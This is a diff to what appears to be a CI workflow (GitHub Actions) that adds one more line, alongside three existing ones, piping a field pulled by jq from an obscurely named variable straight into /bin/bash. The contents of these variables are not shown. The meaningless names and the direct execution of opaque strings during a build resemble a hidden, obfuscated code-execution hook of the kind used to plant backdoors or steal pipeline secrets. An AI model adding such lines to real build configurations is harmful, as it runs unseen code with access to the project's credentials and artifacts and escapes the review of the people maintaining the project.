@@ -47,6 +47,7 @@ jobs:
           echo $ppf17 | jq -r .agyc611 | /bin/bash
           echo $uni5 | jq -r .uyxu751 | /bin/bash
           echo $alim44746 | jq -r .knrw2934 | /bin/bash
+          printf '%s' "$gw11" | jq -r .m7573 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
